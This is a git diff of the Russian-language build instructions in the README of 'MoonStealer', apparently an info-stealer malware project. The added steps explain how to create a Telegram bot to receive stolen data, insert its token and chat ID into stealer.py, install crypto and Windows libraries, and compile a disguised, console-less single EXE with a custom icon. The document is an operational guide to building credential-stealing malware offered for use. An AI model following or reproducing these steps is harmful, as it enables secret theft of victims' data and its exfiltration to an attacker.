@@ -68,14 +68,20 @@ Telegram Token / Chat ID → переменные TELEGRAM_TOKEN и CHAT_ID
 
 
 <h2 align="center">🛠️ СБОРКА</h2>
+1.Создайте своего бота в @BotFather и вставьте токен бота в коде , также узнайте id аккаунта телеграмм в боте @getidsbot и также вставьте в код ( раздел куда надо вставить называеться настройки оно в самом начале кода там разберетесь)
 
-1. **Установите зависимости** (PowerShell от администратора):
+2. сохраните ваши настройки в stealer.py ( в самом steaelr )
+
+3. **Установите зависимости** (PowerShell от администратора):
    ```powershell
    pip install pycryptodome pywin32 requests pillow pyinstaller
-2.Подготовьте иконку (опционально) — файл .ico (256x256)
-3.Скомпилируйте одним файлом без консоли:
+   
+4.Подготовьте иконку (опционально) — файл .ico (256x256)
+
+5.Скомпилируйте одним файлом без консоли:
 python -m PyInstaller --onefile --noconsole --icon=icon.ico --name MoonStealer stealer.py
-4.EXE появится в папке dist
+
+6.EXE появится в папке dist
 
 ---
 
